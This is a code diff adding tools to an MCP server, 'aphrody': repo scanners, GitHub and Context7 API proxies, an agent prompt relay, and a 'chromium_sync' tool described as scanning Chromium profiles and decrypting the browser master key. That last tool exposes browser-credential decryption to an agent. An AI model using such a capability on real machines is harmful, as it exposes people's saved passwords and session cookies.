@@ -44,6 +44,10 @@ const BXC_MCP_BIN = process.env.BXC_MCP_BIN || "bxc-mcp";
 const MEMORY_DB =
 	process.env.BXC_MEMORY_DB ??
 	join(homedir(), ".aphrody", "aphrody-memory.sqlite");
+const GITHUB_TOKEN = process.env.GITHUB_PERSONAL_ACCESS_TOKEN ?? "";
+const CONTEXT7_API_KEY = process.env.CONTEXT7_API_KEY ?? "";
+const CONTEXT7_BASE = "https://mcp.context7.com";
+const GITHUB_API = "https://api.github.com";
 
 // Ensure memory dir exists before touching SQLite.
 mkdirSync(dirname(MEMORY_DB), { recursive: true });
@@ -447,12 +451,319 @@ server.registerTool(
 	},
 );
 
+server.registerTool(
+	"aphrody_scan_tree",
+	{
+		description:
+			"Repo analytics : size + file-count breakdown for top-level groups. Returns JSON (`{byGroup, directories}`).",
+		inputSchema: {
+			root: z.string().default("."),
+			groups: z.string().default("crates"),
+			top_ext: z.number().int().min(1).max(20).default(5),
+		},
+		annotations: { readOnlyHint: true },
+	},
+	async ({ root, groups, top_ext }) => {
+		const r = await runAphrody([
+			"scan",
+			"tree",
+			"--root",
+			root,
+			"--groups",
+			groups,
+			"--top-ext",
+			String(top_ext),
+			"-o",
+			"-",
+		]);
+		if (r.exitCode !== 0) cliError(`scan tree ${root}`, r);
+		// First lines are a human banner ; JSON starts at the first `{`.
+		const idx = r.stdout.indexOf("{");
+		return asTextContent(idx >= 0 ? JSON.parse(r.stdout.slice(idx)) : r.stdout);
+	},
+);
+
+server.registerTool(
+	"aphrody_scan_manifests",
+	{
+		description:
+			"Walk the repo for Cargo.toml / package.json / pyproject.toml / etc. and emit metadata as JSON (`{byType, manifests}`).",
+		inputSchema: { root: z.string().default(".") },
+		annotations: { readOnlyHint: true },
+	},
+	async ({ root }) => {
+		const r = await runAphrody(["scan", "manifests", "--root", root, "-o", "-"]);
+		if (r.exitCode !== 0) cliError(`scan manifests ${root}`, r);
+		const idx = r.stdout.indexOf("{");
+		return asTextContent(idx >= 0 ? JSON.parse(r.stdout.slice(idx)) : r.stdout);
+	},
+);
+
+server.registerTool(
+	"aphrody_chromium_sync",
+	{
+		description:
+			"Forensics : scan Chromium profiles and decrypt the master key (Windows-only path, no-op on other OSes).",
+		inputSchema: {},
+	},
+	async () => {
+		const r = await runAphrody(["chromium", "sync"]);
+		if (r.exitCode !== 0) cliError("chromium sync", r);
+		return asTextContent(r.stdout.trim());
+	},
+);
+
+server.registerTool(
+	"aphrody_a2a_prompt",
+	{
+		description:
+			"Send a prompt to a running A2A agent. Falls back to the bundled Gemini CLI when no A2A server is reachable.",
+		inputSchema: { prompt: z.string() },
+	},
+	async ({ prompt }) => {
+		const r = await runAphrody(["a2a", prompt]);
+		if (r.exitCode !== 0) cliError(`a2a ${prompt}`, r);
+		return asTextContent(r.stdout.trim());
+	},
+);
+
+// ── GitHub proxy (replaces cloud MCP github) ─────────────────────────────────
+
+interface GhResponse {
+	status: number;
+	body: unknown;
+	text: string;
+}
+
+async function gh(
+	method: "GET" | "POST" | "PATCH",
+	path: string,
+	body?: unknown,
+): Promise<GhResponse> {
+	if (!GITHUB_TOKEN) {
+		throw new Error(
+			"GITHUB_PERSONAL_ACCESS_TOKEN env var not set — required for aphrody_github_* tools.",
+		);
+	}
+	const init: RequestInit = {
+		method,
+		headers: {
+			Authorization: `Bearer ${GITHUB_TOKEN}`,
+			Accept: "application/vnd.github+json",
+			"User-Agent": "aphrody-mcp/0.1.0",
+			"X-GitHub-Api-Version": "2022-11-28",
+			...(body ? { "Content-Type": "application/json" } : {}),
+		},
+		...(body ? { body: JSON.stringify(body) } : {}),
+	};
+	const resp = await fetch(`${GITHUB_API}${path}`, init);
+	const text = await resp.text();
+	let parsed: unknown;
+	try {
+		parsed = JSON.parse(text);
+	} catch {
+		parsed = text;
+	}
+	if (!resp.ok) {
+		throw new Error(
+			`GitHub API ${method} ${path} → HTTP ${resp.status}: ${typeof parsed === "string" ? parsed : JSON.stringify(parsed)}`,
+		);
+	}
+	return { status: resp.status, body: parsed, text };
+}
+
+server.registerTool(
+	"aphrody_github_list_issues",
+	{
+		description:
+			"List issues on a GitHub repo. `state` defaults to 'open'. Returns the raw GitHub REST response (array of issues).",
+		inputSchema: {
+			owner: z.string(),
+			repo: z.string(),
+			state: z.enum(["open", "closed", "all"]).default("open"),
+			per_page: z.number().int().min(1).max(100).default(30),
+		},
+		annotations: { readOnlyHint: true },
+	},
+	async ({ owner, repo, state, per_page }) => {
+		const r = await gh(
+			"GET",
+			`/repos/${owner}/${repo}/issues?state=${state}&per_page=${per_page}`,
+		);
+		return asTextContent(r.body);
+	},
+);
+
+server.registerTool(
+	"aphrody_github_create_issue",
+	{
+		description:
+			"Create a GitHub issue. Requires the token to have `repo` scope (or `public_repo` for public repos).",
+		inputSchema: {
+			owner: z.string(),
+			repo: z.string(),
+			title: z.string(),
+			body: z.string().optional(),
+			labels: z.array(z.string()).optional(),
+			assignees: z.array(z.string()).optional(),
+		},
+	},
+	async ({ owner, repo, ...rest }) => {
+		const r = await gh("POST", `/repos/${owner}/${repo}/issues`, rest);
+		return asTextContent(r.body);
+	},
+);
+
+server.registerTool(
+	"aphrody_github_list_prs",
+	{
+		description:
+			"List pull requests on a GitHub repo. Returns the raw GitHub REST response.",
+		inputSchema: {
+			owner: z.string(),
+			repo: z.string(),
+			state: z.enum(["open", "closed", "all"]).default("open"),
+			per_page: z.number().int().min(1).max(100).default(30),
+		},
+		annotations: { readOnlyHint: true },
+	},
+	async ({ owner, repo, state, per_page }) => {
+		const r = await gh(
+			"GET",
+			`/repos/${owner}/${repo}/pulls?state=${state}&per_page=${per_page}`,
+		);
+		return asTextContent(r.body);
+	},
+);
+
+server.registerTool(
+	"aphrody_github_search_repos",
+	{
+		description:
+			"Search GitHub repositories with a `q` query (e.g. 'language:rust topic:cli'). See GitHub REST docs for syntax.",
+		inputSchema: {
+			q: z.string(),
+			sort: z.enum(["stars", "forks", "updated", "best-match"]).default("best-match"),
+			per_page: z.number().int().min(1).max(100).default(20),
+		},
+		annotations: { readOnlyHint: true },
+	},
+	async ({ q, sort, per_page }) => {
+		const sortParam = sort === "best-match" ? "" : `&sort=${sort}`;
+		const r = await gh(
+			"GET",
+			`/search/repositories?q=${encodeURIComponent(q)}&per_page=${per_page}${sortParam}`,
+		);
+		return asTextContent(r.body);
+	},
+);
+
+server.registerTool(
+	"aphrody_github_get_repo",
+	{
+		description:
+			"Fetch the metadata of a single GitHub repository (description, default_branch, stargazers_count, etc.).",
+		inputSchema: { owner: z.string(), repo: z.string() },
+		annotations: { readOnlyHint: true },
+	},
+	async ({ owner, repo }) => {
+		const r = await gh("GET", `/repos/${owner}/${repo}`);
+		return asTextContent(r.body);
+	},
+);
+
+// ── Context7 proxy (replaces cloud MCP context7) ────────────────────────────
+
+async function context7Fetch(
+	method: "GET" | "POST",
+	path: string,
+	body?: unknown,
+): Promise<unknown> {
+	if (!CONTEXT7_API_KEY) {
+		throw new Error(
+			"CONTEXT7_API_KEY env var not set — required for aphrody_context7_* tools.",
+		);
+	}
+	const init: RequestInit = {
+		method,
+		headers: {
+			CONTEXT7_API_KEY,
+			Accept: "application/json, text/event-stream",
+			...(body ? { "Content-Type": "application/json" } : {}),
+		},
+		...(body ? { body: JSON.stringify(body) } : {}),
+	};
+	const resp = await fetch(`${CONTEXT7_BASE}${path}`, init);
+	const text = await resp.text();
+	if (!resp.ok) {
+		throw new Error(`Context7 ${method} ${path} → HTTP ${resp.status}: ${text}`);
+	}
+	try {
+		return JSON.parse(text);
+	} catch {
+		return text;
+	}
+}
+
+server.registerTool(
+	"aphrody_context7_resolve_library",
+	{
+		description:
+			"Resolve a library name (e.g. 'next.js', 'wgpu', 'react') to a stable Context7 library ID usable in aphrody_context7_get_docs.",
+		inputSchema: { library_name: z.string() },
+		annotations: { readOnlyHint: true },
+	},
+	async ({ library_name }) => {
+		const r = await context7Fetch("POST", "/mcp", {
+			jsonrpc: "2.0",
+			id: 1,
+			method: "tools/call",
+			params: {
+				name: "resolve-library-id",
+				arguments: { libraryName: library_name },
+			},
+		});
+		return asTextContent(r);
+	},
+);
+
+server.registerTool(
+	"aphrody_context7_get_docs",
+	{
+		description:
+			"Fetch up-to-date documentation for a Context7-resolved library. `topic` (optional) narrows the response (e.g. 'app-router', 'fetch-api').",
+		inputSchema: {
+			library_id: z
+				.string()
+				.describe("Context7 library ID (resolved via aphrody_context7_resolve_library)"),
+			topic: z.string().optional(),
+			tokens: z.number().int().min(1000).max(50000).default(5000),
+		},
+		annotations: { readOnlyHint: true },
+	},
+	async ({ library_id, topic, tokens }) => {
+		const r = await context7Fetch("POST", "/mcp", {
+			jsonrpc: "2.0",
+			id: 1,
+			method: "tools/call",
+			params: {
+				name: "get-library-docs",
+				arguments: {
+					context7CompatibleLibraryID: library_id,
+					...(topic ? { topic } : {}),
+					tokens,
+				},
+			},
+		});
+		return asTextContent(r);
+	},
+);
+
 // ---------------------------------------------------------------------------
 // `--list-tools` CLI mode (matches bxc-mcp UX)
 // ---------------------------------------------------------------------------
 
 if (process.argv.includes("--list-tools")) {
-	// Internal SDK API — fall back to a hand-rolled catalogue if it changes.
 	const internal = (server as unknown as {
 		_registeredTools?: Record<
 			string,
@@ -463,24 +774,8 @@ if (process.argv.includes("--list-tools")) {
 		? Object.entries(internal).map(([name, t]) => ({
 				name,
 				description: t.description,
-				inputSchema: t.inputSchema,
 			}))
-		: [
-				"aphrody_scrape",
-				"aphrody_recon",
-				"aphrody_detect",
-				"aphrody_search",
-				"aphrody_atlas_route",
-				"aphrody_extract_structured",
-				"aphrody_vision_analyze",
-				"aphrody_memory_set",
-				"aphrody_memory_get",
-				"aphrody_memory_list",
-				"aphrody_doctor",
-				"aphrody_version",
-				"aphrody_dns",
-				"aphrody_notify",
-			].map((name) => ({ name }));
+		: [];
 	process.stdout.write(`${JSON.stringify(catalog, null, 2)}\n`);
 	process.exit(0);
 }
